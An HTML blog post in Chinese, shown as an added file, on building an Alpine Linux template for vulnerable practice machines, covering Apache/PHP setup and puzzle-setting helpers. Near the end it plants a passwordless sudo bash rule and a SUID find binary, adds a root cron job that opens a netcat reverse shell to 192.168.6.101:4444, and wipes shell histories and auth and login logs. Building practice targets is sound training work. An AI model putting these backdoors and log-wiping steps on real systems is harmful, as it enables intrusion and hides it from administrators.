@@ -1,0 +1,517 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>the0n3 - AlpineLinux模板构建</title>
+        <meta name="description" content="the0n3">
+            <link rel="canonical" href="https://blog.the0n3.top">
+        <script>
+        (function () {
+            try {
+                var key = 'theme';
+                var saved = localStorage.getItem(key);
+                var theme = (saved === 'dark' || saved === 'light') ? saved : 'light';
+                document.documentElement.setAttribute('data-theme', theme);
+                document.documentElement.style.colorScheme = theme;
+            } catch (e) {
+                document.documentElement.setAttribute('data-theme', 'light');
+                document.documentElement.style.colorScheme = 'light';
+            }
+        })();
+    </script>
+    <!-- 使用 GitHub Markdown 样式 -->
+    <link rel="stylesheet" href="/assets/css/github-markdown.css">
+    <link rel="stylesheet" href="/assets/css/site.css">
+            <link rel="stylesheet" href="/assets/css/reading-progress.css">
+            <link rel="stylesheet" href="/assets/css/image-enhance.css">
+        <link rel="stylesheet" href="/assets/css/nav-reveal.css">
+    <!-- 代码高亮样式 -->
+    <link rel="stylesheet" href="/assets/prism/prism.css">
+</head>
+<body>
+        <div class="reading-progress" aria-hidden="true">
+        <div class="reading-progress__bar"></div>
+    </div>
+        <header>
+        <nav>
+            <div class="nav-right">
+                <a href="/">首页</a>
+                <a href="/archives">归档</a>
+                <a href="/categories">分类</a>
+                <a href="/tags">标签</a>
+            </div>
+        </nav>
+    </header>
+                <div class="page-layout">
+            <main class="markdown-body">
+                
+<article class="post-content">
+    <h1>AlpineLinux模板构建</h1>
+    <p>
+        <span class="meta">发布于: 2026-01-27 22:54</span>
+    </p>
+    <div class="post-body">
+        <h2>选择 AlpineLinux</h2>
+<blockquote>
+<p>Small. Simple. Secure.</p>
+</blockquote>
+<p>Alpine Linux 是一个基于 musl libc 和 busybox 的安全、轻量级的 Linux 发行版。Alpine Linux 以其小巧的体积和高效的性能而闻名。</p>
+<h2>Alpine Linux 官网</h2>
+<p>Alpine Linux 官网：<a href="https://www.alpinelinux.org/">https://www.alpinelinux.org/</a></p>
+<p>下载 Virtual 版本镜像，适合虚拟机使用。</p>
+<p><img src="/images/template/1.png" alt="" /></p>
+<h2>模板靶机用户</h2>
+<p>root:todd</p>
+<h2>VirtualBox 安装 Alpine Linux</h2>
+<p>使用 VirtualBox 创建一个新的虚拟机，选择下载的 Alpine Linux 镜像进行安装。</p>
+<p>安装完成，使用 root 用户登录，进入 live 安装环境，默认无密码，登录成功后，提示使用 setup-alpine 命令进行初始配置。</p>
+<p>过程大多数选项保持默认即可，设置 root 密码 <code>todd</code>。</p>
+<p><img src="/images/template/2.png" alt="" /></p>
+<p>在提示选择镜像源时，使用 <code>f</code> 参数，让 alpine 自动尝试并选择最快的镜像源。</p>
+<p><img src="/images/template/3.png" alt="" /></p>
+<p>在安装过程会提示是否添加<code>user</code>，直接回车，使用默认的<code>no</code>，是否安装 <code>openssh</code>，输入 <code>yes</code>，是否允许 root 用户通过 ssh 登录，输入 <code>yes</code>。</p>
+<p><img src="/images/template/4.png" alt="" /></p>
+<p>磁盘选择列出的磁盘，使用方式选择<code>sys</code>，表示将 Alpine 安装到磁盘上，输入 <code>y</code>，确认写入并继续。</p>
+<p><img src="/images/template/5.png" alt="" /></p>
+<p>提示重启时，输入 <code>poweroff</code> 关闭虚拟机，移除virtualbox的光驱，更改启动顺序为硬盘启动，重新启动虚拟机。</p>
+<p><img src="/images/template/6.png" alt="" /></p>
+<p>现在，就可以尝试使用 ssh 远程登录 Alpine Linux 虚拟机了。</p>
+<h2>解决 VirtualBox 和 VMware 下网卡命名不一致导致的网络不可用问题</h2>
+<p><strong>说明</strong></p>
+<p>本模板通过内核参数 net.ifnames=0 biosdevname=0 强制使用传统的 eth0 网络接口命名，以避免在 VirtualBox、VMware 等不同虚拟化平台之间迁移时因网卡命名差异导致网络不可用的问题。</p>
+<p>优点：</p>
+<ul>
+<li>跨虚拟化平台部署稳定，避免首次启动无网络</li>
+<li>简化网络配置，适合作为靶机 / 漏洞演示模板</li>
+<li>单网卡 + DHCP 场景下可预测性更高</li>
+</ul>
+<p>注意事项：</p>
+<ul>
+<li>该设置不适合多网卡或复杂网络环境</li>
+<li>不推荐用于生产环境或云主机</li>
+<li>如需扩展多网卡，请恢复可预测命名或使用 udev/MAC 绑定</li>
+</ul>
+<p>解决 Linux 在不同虚拟化平台（VirtualBox / VMware）之间迁移时，因可预测网卡命名机制导致的网络接口命名不一致问题</p>
+<p>下面仅尝试在 Alpine Linux 上进行说明，其他发行版未测试。</p>
+<p>查看磁盘分区信息，root分区在 <code>/dev/sda3</code></p>
+<p><img src="/images/template/8.png" alt="" /></p>
+<p>这个分区名可能会因不同虚拟化平台而变化，使用 <code>blkid</code> 命令查看分区的 UUID，UUID 永远指向同一个分区。</p>
+<p><img src="/images/template/7.png" alt="" /></p>
+<p>编辑 <code>/etc/update-extlinux.conf</code>，修改 bootloader（锁死 eth0 + 稳定 root 分区）</p>
+<p>找到 default_kernel_opts 行，修改为如下内容：</p>
+<pre><code class="language-bash"># default_kernel_opts="quiet rootfstype=ext4"
+default_kernel_opts="quiet rootfstype=ext4 net.ifnames=0 biosdevname=0"</code></pre>
+<p>文件里已经默认指定了 root 分区为 UUID</p>
+<p><img src="/images/template/9.png" alt="" /></p>
+<p>应用配置，重启验证</p>
+<pre><code class="language-bash">update-extlinux
+reboot</code></pre>
+<p>验证内核参数</p>
+<pre><code class="language-bash">root=UUID=7762e2e9-4b0c-4cf2-a61b-23111b666c5f
+net.ifnames=0
+biosdevname=0</code></pre>
+<p><img src="/images/template/10.png" alt="" /></p>
+<h2>修改 Alpine Linux ssh默认提示</h2>
+<p>编辑 <code>/etc/motd</code> 文件，修改 ssh 登录提示信息</p>
+<p><img src="/images/template/11.png" alt="" /></p>
+<p>效果：</p>
+<p><img src="/images/template/12.png" alt="" /></p>
+<p><img src="/images/template/13.png" alt="" /></p>
+<h2>修改开机 tty 控制台提示</h2>
+<p>IP、hostname 等信息需要动态获取，ubuntu、kali等发行版可以直接在 <code>/etc/issue</code> 里使用变量<code>\4</code>、<code>\n</code>，但是 Alpine Linux 不支持。</p>
+<p>Alpine 使用 OpenRC + getty 服务管理 tty 控制台登录。</p>
+<p>编辑:</p>
+<pre><code class="language-bash">vi /etc/inittab</code></pre>
+<p>修改 tty1，参数解释：</p>
+<ul>
+<li><code>-n</code>：表示不进行登录名的提示，直接调用指定的登录程序。</li>
+<li><code>-l /usr/local/bin/tty-banner.sh</code>：指定登录程序为 <code>/usr/local/bin/tty-banner.sh</code> 脚本，而不是默认的登录程序（通常是 <code>/sbin/getty</code>）。这个脚本可以自定义登录提示信息。</li>
+</ul>
+<pre><code class="language-bash">tty1::respawn:/sbin/getty -n -l /usr/local/bin/tty-banner.sh 38400 tty1</code></pre>
+<p>创建 <code>/usr/local/bin/tty-banner.sh</code> 脚本，内容如下：</p>
+<pre><code class="language-bash">#!/bin/sh
+
+PATH=/usr/sbin:/usr/bin:/sbin:/bin
+export PATH
+
+/usr/bin/clear 2&gt;/dev/null || clear
+
+HOST="$(hostname 2&gt;/dev/null || echo unknown)"
+
+IP="$(
+  /sbin/ip -4 addr show eth0 2&gt;/dev/null \
+  | /usr/bin/awk '/inet /{print $2}' \
+  | /usr/bin/cut -d/ -f1
+)"
+[ -z "$IP" ] &amp;&amp; IP="DHCP not ready"
+
+cat &lt;&lt;'EOF'
+
+                                   .     **                                     
+                                *           *.                                  
+                                              ,*                                
+                                                 *,                             
+                         ,                         ,*                           
+                      .,                              *,                        
+                    /                                    *                      
+                 ,*                                        *,                   
+               /.                                            .*.                
+             *                                                  **              
+             ,*                                               ,*                
+                **                                          *.                  
+                   **                                    **.                    
+                     ,*                                **                       
+                        *,                          ,*                          
+                           *                      **                            
+                             *,                .*                               
+                                *.           **                                 
+                                  **      ,*,                                   
+                                     ** *,     HackMyVM
+
+QQ Group:   660930334
+EOF
+
+echo " Hostname : $HOST"
+echo " IP Addr  : $IP"
+exec /bin/login</code></pre>
+<p>赋予脚本可执行权限：</p>
+<pre><code class="language-bash">chmod +x /usr/local/bin/tty-banner.sh</code></pre>
+<p>效果图，丑是丑了点</p>
+<p><img src="/images/template/15.png" alt="" /></p>
+<p>流程：</p>
+<pre><code class="language-bash">init
+ └─ getty (respawn)
+      └─ -l tty-banner.sh
+            ├─ 打印 banner
+            └─ exec /bin/login</code></pre>
+<h2>安装 sudo</h2>
+<p>Alpine Linux 默认没有安装 sudo，可以手动安装。</p>
+<p>sudo 包含在 <code>community</code> 仓库中，确保已经启用该仓库，编辑 <code>/etc/apk/repositories</code> 文件，取消注释 <code>community</code> 仓库。</p>
+<pre><code class="language-bash">vi /etc/apk/repositories</code></pre>
+<p>取消注释 community 仓库行：</p>
+<pre><code class="language-bash">http://dl-cdn.alpinelinux.org/alpine/v3.18/community</code></pre>
+<p>更新包索引并安装 sudo：</p>
+<pre><code class="language-bash">apk update
+apk add sudo</code></pre>
+<p>验证安装成功：</p>
+<pre><code class="language-bash">sudo -V</code></pre>
+<p><img src="/images/template/16.png" alt="" /></p>
+<h2>安装 Apache2 + PHP web环境</h2>
+<p><strong>安装 Apache2</strong></p>
+<pre><code class="language-bash">apk add apache2</code></pre>
+<p>启动并设置为开机自启</p>
+<pre><code class="language-bash">rc-service apache2 start
+rc-update add apache2 default</code></pre>
+<p>测试：</p>
+<pre><code class="language-bash">echo "&lt;h1&gt;Apache OK&lt;/h1&gt;" &gt; /var/www/localhost/htdocs/index.html</code></pre>
+<p><img src="/images/template/17.png" alt="" /></p>
+<p><strong>安装 PHP 和 php-fpm</strong></p>
+<pre><code class="language-bash">apk add php php-fpm</code></pre>
+<p>确认 php-fpm 服务脚本名称：</p>
+<blockquote>
+<p>注：Alpine 版本不同，PHP 版本号可能不同（如 php-fpm83），请根据实际按照的包名调整命令</p>
+</blockquote>
+<pre><code class="language-bash">localhost:~# ls -1 /etc/init.d | grep -E 'php|fpm'
+php-fpm84</code></pre>
+<p>启动 php-fpm 并设置为开机自启</p>
+<pre><code class="language-bash">rc-service php-fpm84 start
+rc-update add php-fpm84 default</code></pre>
+<p><img src="/images/template/18.png" alt="" /></p>
+<h2>配置 Apache2 解析 PHP</h2>
+<p>备份 <code>/etc/php84/php-fpm.d/www.conf</code> 文件</p>
+<pre><code class="language-bash">cp /etc/php84/php-fpm.d/www.conf /etc/php84/php-fpm.d/www.conf.bak</code></pre>
+<p>把非注释部分提取并覆盖回原文件</p>
+<pre><code class="language-bash">grep -v '^;' /etc/php84/php-fpm.d/www.conf.bak | grep '.' &gt; /etc/php84/php-fpm.d/www.conf</code></pre>
+<p>编辑 php-fpm pool 配置，修改 <code>listen</code> 参数为 <code>/var/run/php-fpm.sock</code></p>
+<pre><code class="language-bash">vi /etc/php84/php-fpm.d/www.conf</code></pre>
+<p>找到 <code>listen</code> 行，修改为：</p>
+<pre><code class="language-bash">listen = /run/php-fpm84/php-fpm.sock</code></pre>
+<p>添加 listen.owner 和 listen.group 行，设置 socket 文件的所有者和所属组为 <code>apache</code></p>
+<pre><code class="language-bash">[www]
+user = apache
+group = apache
+
+listen = /run/php-fpm84/php-fpm.sock
+listen.owner = apache
+listen.group = apache
+listen.mode = 0660
+
+pm = dynamic
+pm.max_children = 5
+pm.start_servers = 2
+pm.min_spare_servers = 1
+pm.max_spare_servers = 3</code></pre>
+<p><img src="/images/template/19.png" alt="" /></p>
+<p><strong>重启 php-fpm84，让 socket 生成</strong></p>
+<pre><code class="language-bash">rc-service php-fpm84 restart</code></pre>
+<p>验证生成了 php-fpm.sock ：</p>
+<p><img src="/images/template/20.png" alt="" /></p>
+<p><strong>修改 Apache2 主配置文件，启用 PHP 支持</strong>
+备份 <code>/etc/apache2/httpd.conf</code> 文件</p>
+<pre><code class="language-bash">cp /etc/apache2/httpd.conf /etc/apache2/httpd.conf.bak</code></pre>
+<p>把非注释部分提取并覆盖回原文件</p>
+<pre><code class="language-bash">grep -v '^#' /etc/apache2/httpd.conf.bak | grep '.' &gt; /etc/apache2/httpd.conf</code></pre>
+<p>把 web 根目录改为 <code>/var/www/html</code>，修改主配置文件的 DocumentRoot 行：</p>
+<pre><code class="language-bash">DocumentRoot "/var/www/html"
+
+&lt;Directory "/var/www/html"&gt;
+    AllowOverride None
+    Require all granted
+&lt;/Directory&gt;</code></pre>
+<p><img src="/images/template/21.png" alt="" /></p>
+<p>修改 ServerRoot 行：</p>
+<pre><code class="language-bash">ServerRoot /usr/lib/apache2</code></pre>
+<p>日志路径修改，同时添加访问目录时，默认返回 index.php 文件：</p>
+<pre><code class="language-bash">ErrorLog /var/log/apache2/error.log
+CustomLog /var/log/apache2/access.log combined</code></pre>
+<p><img src="/images/template/28.png" alt="" /></p>
+<p>下面还有条默认的日志路径，使用相对路径，注释掉</p>
+<p><img src="/images/template/26.png" alt="" /></p>
+<p>创建 <code>/var/www/html</code> 目录，并设置权限</p>
+<pre><code class="language-bash">mkdir -p /var/www/html
+chown -R apache:apache /var/www/html
+chmod -R 755 /var/www/html
+mkdir -p /var/log/apache2
+chown -R apache:apache /var/log/apache2
+chmod -R 755 /var/log/apache2</code></pre>
+<p><strong>配置 Apache2 以使用 PHP-FPM</strong></p>
+<p>修改主配置文件，在配置文件开头补充模块 proxy_module 和 proxy_fcgi_module，并配置处理 PHP 文件的方式。</p>
+<pre><code class="language-conf">LoadModule proxy_module modules/mod_proxy.so
+LoadModule proxy_fcgi_module modules/mod_proxy_fcgi.so</code></pre>
+<p>在主配置文件末尾<code>IncludeOptional /etc/apache2/conf.d/*.conf</code>之前添加以下内容：</p>
+<pre><code class="language-conf">&lt;FilesMatch \.php$&gt;
+    SetHandler "proxy:unix:/run/php-fpm84/php-fpm.sock|fcgi://localhost/"
+&lt;/FilesMatch&gt;</code></pre>
+<p><img src="/images/template/22.png" alt="" /></p>
+<p>重启服务</p>
+<pre><code class="language-bash">rc-service php-fpm84 restart
+rc-service apache2 restart</code></pre>
+<p>apache 报错，找不到动态模块 mod_proxy.so 和 mod_proxy_fcgi.so，发现我的模块都在 <code>/usr/lib/apache2/</code> 目录下，而不是 <code>/usr/lib/apache2/modules/</code> 目录下。</p>
+<p><img src="/images/template/24.png" alt="" /></p>
+<p>备份，在批量删除 modules 前缀</p>
+<pre><code class="language-bash">cp /etc/apache2/httpd.conf /etc/apache2/httpd.conf.bak2
+sed -i 's# modules/# #g' /etc/apache2/httpd.conf</code></pre>
+<p>安装 <code>mod_proxy</code> 和 <code>mod_proxy_fcgi</code> 模块，<code>mod_proxy_fcgi</code> 打包在 <code>mod_proxy</code>里。</p>
+<pre><code class="language-bash">apk add apache2-proxy</code></pre>
+<p>编辑/etc/apache2/conf.d/proxy.conf，修改 modules/ 路径部分</p>
+<p>备份</p>
+<pre><code class="language-bash">cp /etc/apache2/conf.d/proxy.conf /etc/apache2/conf.d/proxy.conf.bak</code></pre>
+<p>需要把 moudles/ 前缀删除</p>
+<p><img src="/images/template/25.png" alt="" /></p>
+<pre><code class="language-bash">sed -i 's#modules/##g' /etc/apache2/conf.d/proxy.conf</code></pre>
+<p>重启服务，终于起来了</p>
+<pre><code class="language-bash">rc-service apache2 restart</code></pre>
+<p><img src="/images/template/27.png" alt="" /></p>
+<p>在 web 根目录创建测试 PHP 文件</p>
+<pre><code class="language-bash">echo "&lt;?php phpinfo(); ?&gt;" &gt; /var/www/html/index.php</code></pre>
+<p><img src="/images/template/29.png" alt="" /></p>
+<p>此时，磁盘大小约为 110MB</p>
+<p><img src="/images/template/30.png" alt="" /></p>
+<h2>补充基础工具环境</h2>
+<p>安装 curl、wget、netcat-openbsd、socat、bash 等基础工具，vim大小约为30-40MB，按需安装。</p>
+<pre><code class="language-bash">apk add curl wget netcat-openbsd socat bash</code></pre>
+<h2>安装其他 （可选）</h2>
+<p>下面做命令安装演示，按需添加，不再统一添加到模板中。</p>
+<p>安装vim</p>
+<pre><code class="language-bash">apk add vim</code></pre>
+<p>安装编译环境</p>
+<pre><code class="language-bash"># 安装 gcc, make, musl-dev 等编译环境
+apk add build-base git</code></pre>
+<p>安装 python3、nodejs</p>
+<pre><code class="language-bash">apk add python3 nodejs npm</code></pre>
+<p>安装 nginx</p>
+<pre><code class="language-bash">apk add nginx</code></pre>
+<p>安装 mariadb</p>
+<pre><code class="language-bash">apk add mariadb mariadb-client</code></pre>
+<h2>操作示例</h2>
+<h3>设置主机名</h3>
+<p>编辑 <code>/etc/hostname</code> 文件，设置主机名</p>
+<pre><code class="language-bash">hostname="tmp"
+echo "$hostname" &gt; /etc/hostname
+cat &gt;/etc/hosts &lt;&lt;EOF
+127.0.0.1   localhost
+127.0.1.1   $hostname
+::1         localhost ip6-localhost ip6-loopback
+EOF
+hostname -F /etc/hostname</code></pre>
+<h3>简单设置提示符</h3>
+<p>创建 <code>/etc/bash/prompt.sh</code> 文件</p>
+<pre><code class="language-bash">cat &gt; /etc/bash/prompt.sh &lt;&lt;'EOF'
+[ -n "$BASH_VERSION" ] || return 0
+if [ "$(id -u)" -eq 0 ]; then
+  PS1='\u@\h:\w# '
+else
+  PS1='\[\e[1;32m\]\u@\h\[\e[0m\]:\w\$ '
+fi
+EOF
+chmod 0644 /etc/bash/prompt.sh</code></pre>
+<p>给未来的用户生效：</p>
+<pre><code class="language-bash">mkdir -p /etc/skel
+cat &gt; /etc/skel/.bashrc &lt;&lt;'EOF'
+case "$-" in
+  *i*) [ -r /etc/bash/prompt.sh ] &amp;&amp; . /etc/bash/prompt.sh ;;
+esac
+EOF
+chmod 0644 /etc/skel/.bashrc</code></pre>
+<p>创建 <code>/etc/bash/bashrc</code> 文件，<code>/etc/profile.d/00-bashrc.sh</code>会调用这个文件：</p>
+<pre><code class="language-bash">cat &gt; /etc/bash/bashrc &lt;&lt;'EOF'
+[ -r /etc/bash/prompt.sh ] &amp;&amp; . /etc/bash/prompt.sh
+EOF</code></pre>
+<h3>创建移除普通用户</h3>
+<p><strong>创建普通用户</strong></p>
+<ul>
+<li>-D : 使用默认选项创建用户，不会提示输入额外信息。</li>
+<li>-G : 指定用户所属的附加组，这里将用户添加到 the0n3 组中。</li>
+<li>-s : 指定用户的登录 shell，这里使用 /bin/bash。</li>
+<li>-h : 指定用户的主目录，这里设置为 /home/the0n3。</li>
+<li>-g : 用户描述信息。<pre><code class="language-bash">addgroup the0n3
+adduser -D -G the0n3 -s /bin/bash -h /home/the0n3 the0n3
+echo "the0n3:todd" | chpasswd</code></pre>
+</li>
+</ul>
+<p>方便出题，打印创建用户的命令</p>
+<pre><code class="language-bash">name='lanyangyang'
+pass=$(openssl rand -base64 18)
+shell="\nRun：\naddgroup $name\nadduser -D -G $name -s /bin/bash -h /home/$name $name\necho \"$name:$pass\" | chpasswd"
+echo -e "$shell"</code></pre>
+<p><strong>移除普通用户</strong></p>
+<pre><code class="language-bash"># 移除用户及主目录
+deluser --remove-home username  </code></pre>
+<p>移除用户 the0n3 及其主目录：</p>
+<pre><code class="language-bash">deluser --remove-home the0n3</code></pre>
+<h3>安装卸载常用工具包</h3>
+<p>alpine 使用 apk 包管理器安装常用工具包：</p>
+<pre><code class="language-bash">apk add xxx</code></pre>
+<p>例如，安装 git、curl、wget：</p>
+<pre><code class="language-bash">apk add git curl wget</code></pre>
+<p>安装 python3 和 pip：</p>
+<pre><code class="language-bash">apk add python3 py3-pip</code></pre>
+<p>如果只是需要 flask 服务，可以直接安装 flask 包：</p>
+<pre><code class="language-bash">apk add python3 py3-flask</code></pre>
+<p>卸载已安装的工具包：</p>
+<pre><code class="language-bash">apk del xxx</code></pre>
+<p>例如，卸载 git：</p>
+<pre><code class="language-bash">apk del git</code></pre>
+<h3>服务操作</h3>
+<p>alpine 使用 OpenRC 管理服务。</p>
+<p>设置服务开机自启：</p>
+<pre><code class="language-bash">rc-update add 服务名 default</code></pre>
+<p>取消服务开机自启：</p>
+<pre><code class="language-bash">rc-update del 服务名 default</code></pre>
+<p>启动服务：</p>
+<pre><code class="language-bash">rc-service 服务名 start</code></pre>
+<p>停止服务：</p>
+<pre><code class="language-bash">rc-service 服务名 stop</code></pre>
+<p>查看服务状态：</p>
+<pre><code class="language-bash">rc-service 服务名 status</code></pre>
+<p>重启服务：</p>
+<pre><code class="language-bash">rc-service 服务名 restart</code></pre>
+<h3>创建自定义服务</h3>
+<p>创建 OpenRC 服务脚本</p>
+<pre><code class="language-bash">cat &gt;/etc/init.d/app &lt;&lt;'EOF'
+#!/sbin/openrc-run
+
+name="app"
+description="Run app.py as tuf user"
+
+command="/usr/bin/python3"
+command_args="/app/app.py"
+command_user="tuf:tuf"
+
+command_background="yes"
+pidfile="/run/${RC_SVCNAME}.pid"
+
+depend() {
+    need net
+}
+
+EOF</code></pre>
+<p>授予执行权限</p>
+<pre><code class="language-bash">chmod +x /etc/init.d/app</code></pre>
+<p>加入开机自启动并立即启动</p>
+<pre><code class="language-bash">rc-update add app default
+# rc-service app start</code></pre>
+<h3>添加 sudo 权限</h3>
+<p>编辑 <code>/etc/sudoers</code> 文件，或 <code>/etc/sudoers.d/</code> 目录下创建新文件，以下几种格式：</p>
+<pre><code class="language-ini"># 允许用户 the0n3 使用 sudo 执行所有命令需要密码
+the0n3 ALL=(ALL) ALL
+# 允许用户 the0n3 使用 sudo 执行所有命令且不需要密码
+the0n3 ALL=(ALL) NOPASSWD: ALL
+# 允许用户 the0n3 使用 sudo 执行特定命令
+the0n3 ALL=(ALL) NOPASSWD: /bin/ls, /usr/bin/id</code></pre>
+<p>给 the0n3 用户授权 sudo bash 举例:</p>
+<pre><code class="language-bash">echo 'the0n3 ALL=(ALL) NOPASSWD: /bin/bash' &gt; /etc/sudoers.d/the0n3
+chmod 0440 /etc/sudoers.d/the0n3</code></pre>
+<h3>设置 SUID 权限</h3>
+<p>假设我们要创建一个拥有 SUID 权限的 <code>find</code> 命令作为提权点，这允许用户以文件所有者（通常是 root）的权限执行命令。</p>
+<pre><code class="language-bash"># 复制二进制文件到常用目录
+cp /usr/bin/find /usr/local/bin/find
+
+# 赋予 SUID 权限
+chmod u+s /usr/local/bin/find
+# 验证 SUID 权限
+ls -l /usr/local/bin/find</code></pre>
+<h3>定时任务</h3>
+<p>alpine 使用 <code>crond</code> 服务管理定时任务，可以在 <code>/etc/crontabs/</code> 目录下创建文件名为用户名的脚本文件。</p>
+<pre><code class="language-bash">echo '* * * * * root /bin/bash -c "busybox nc 192.168.6.101 4444 -e bash"' &gt; /etc/crontabs/root</code></pre>
+<h3>痕迹清理</h3>
+<p>清理 bash 历史记录</p>
+<pre><code class="language-bash"># 如果有vim
+mkdir -p /etc/vim
+echo 'set viminfo=' &gt;&gt; /etc/vim/vimrc
+# 清理当前会话历史、历史命令
+history -c
+rm -rf /root/.ash_history /home/*/.ash_history
+rm -rf /root/.bash_history /home/*/.bash_history
+rm -rf /root/.viminfo /home/*/.viminfo
+ln -s /dev/null /root/.bash_history
+ln -s /dev/null /home/*/.bash_history
+rm -rf /root/.python_history /home/*/.python_history
+# 清理日志
+&gt; /var/log/apache2/access.log
+&gt; /var/log/apache2/error.log
+&gt; /var/log/auth.log
+&gt; /var/log/apk.log
+&gt; /var/log/syslog
+: &gt; /var/log/wtmp
+: &gt; /var/log/btmp
+&gt; /var/log/messages
+# 临时文件（可选）
+rm -rf /tmp/* /var/tmp/*
+# 靶机 ssh 记录
+rm -rf /root/.ssh/known_hosts
+rm -rf /home/*/.ssh/known_hosts</code></pre>
+<p>清理 apk 缓存</p>
+<pre><code class="language-bash"># 清理 apk 缓存
+apk cache clean
+rm -rf /var/cache/apk/*</code></pre>    </div>
+        <div class="post-meta-footer">
+                    <span class="post-meta-item">分类:
+                                    <span>notes</span>
+                            </span>
+                            <span class="post-meta-item">标签:
+                                    <span>#AlpineLinux</span>
+                            </span>
+            </div>
+    </article>
+
+            </main>
+                <aside class="post-toc" aria-label="Table of contents">
+        <div class="toc-title">目录</div>
+        <nav class="toc-list"></nav>
+    </aside>
+            </div>
+        <button id="backToTop" class="fab fab-top" type="button" aria-label="返回顶部" title="返回顶部">↑</button>
+    <button id="themeToggle" class="theme-toggle" type="button" aria-label="切换主题" title="切换主题"></button>
+    <script src="/assets/js/site.js"></script>
+        <script src="/assets/js/navReveal.js"></script>
+        <script src="/assets/js/readingProgress.js"></script>
+            <script src="/assets/js/imageEnhance.js"></script>
+        <!-- 启动代码高亮及行号显示 -->
+    <script src="/assets/prism/prism.js"></script>
+    <script src="/assets/prism/prism-line-number.js"></script>
+    <!-- 主题切换 -->
+    <script src="/assets/js/ThemeSwitch.js"></script>
+</body>
+</html>
